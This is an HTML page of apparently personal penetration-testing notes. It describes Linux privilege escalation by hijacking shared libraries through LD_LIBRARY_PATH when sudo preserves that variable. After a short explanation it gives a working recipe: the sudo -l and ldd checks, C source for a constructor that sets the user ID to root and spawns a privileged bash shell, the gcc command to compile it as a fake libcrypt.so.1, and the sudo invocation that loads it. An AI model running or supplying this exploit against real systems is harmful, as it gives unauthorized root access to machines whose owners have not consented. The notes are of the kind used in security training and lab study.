<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>LD_LIBRARY_PATH</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>LD_LIBRARY_PATH</h1><br /><strong>
      <h3>How it works LD_LIBRARY_PAT privilege escalation</h3>
    </strong><br />• The LD_LIBRARY_PATH environment variable contains a set of directories where shared libraries are
    searched for first.<br />• The ldd command can be used to print the shared libraries used by a program:<br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;ldd&nbsp;<span
          style="color:#000000;font-weight:400">&lt;</span>program<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br />• By creating a shared library with the same name as one used by a program, and setting LD_LIBRARY_PATH
    to its parent directory, the program will load our shared library instead.<br /><br /><br /><strong>
      <h3>ACTION:</h3>
    </strong><br />0. Check if <strong>env_keep</strong> option includes the <span
      style="color:#ff00e0;">LD_LIBRARY_PATH</span> environment variable<br />1. Run ldd against <span
      style="color:#ff8700;">any allowed program using sudo</span><br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;sudo&nbsp;-l</div>
    </div><br /> <a href=""><img src="images/1300-1.png" alt="images/1300-1.png" /></a><br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;ldd&nbsp;<span
          style="color:#000000;font-weight:400">&lt;</span>programBinary<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br /> <a href=""><img src="images/1300-2.png" alt="images/1300-2.png" /></a><br /> Hijacking shared objects
    using this method is hit or miss.<br /> We have to try each one from the list until we can find the one that work
    and become root(with point 4)<br />2. Create a file (library_path.c) with the following contents:<br />
    <div class="codebox">
      <div class="codebox">
        target@debian:~$&nbsp;vim&nbsp;library_path.c<br />&nbsp;&nbsp;&nbsp;&nbsp;#i&nbsp;--&gt;&nbsp;insert&nbsp;text<br />&nbsp;&nbsp;&nbsp;&nbsp;#Esc&nbsp;--&gt;&nbsp;to&nbsp;finish&nbsp;to&nbsp;insert&nbsp;the&nbsp;text<br />&nbsp;&nbsp;&nbsp;&nbsp;#:wq&nbsp;--&gt;&nbsp;write&nbsp;and&nbsp;quit
      </div>
    </div><br />
    <div class="codebox">
      <div class="codebox">
        #include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;stdlib.h&gt;<br />static&nbsp;void&nbsp;hijack()&nbsp;__attribute__((constructor));<br />void&nbsp;hijack()&nbsp;<span
          style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;unsetenv(&quot;LD_LIBRARY_PATH&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;setresuid(0,0,0);<br />&nbsp;&nbsp;&nbsp;&nbsp;system(&quot;/bin/bash&nbsp;-p&quot;);<br /><span
          style="color:#000000;font-weight:400">}</span></div>
    </div><br /> It should spawn a shell when loaded<br />3. Compile library_path.c into the shared object file chosen
    (example: libcrypt.so.1)<br />
    <div class="codebox">
      <div class="codebox">
        target@debian:~$&nbsp;gcc&nbsp;-o&nbsp;libcrypt.so.1&nbsp;-shared&nbsp;-fPIC&nbsp;library_path.c</div>
    </div><br />4. Run binary of the program using sudo, while setting the LD_LIBRARY_PATH environment variable to the
    current path (where we compiled library_path.c)<br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;sudo&nbsp;LD_LIBRARY_PATH=.&nbsp;<span
          style="color:#000000;font-weight:400">&lt;</span>programBinary<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br /> <a href=""><img src="images/1300-3.png"
        alt="images/1300-3.png" /></a><br /><br /><br /><br />Bibliography:<br /><a
      href="https://www.contextis.com/en/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library" target="_blank">https://www.contextis.com/en/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library</a><br /><br /><br />
  </div>
</body>

</html>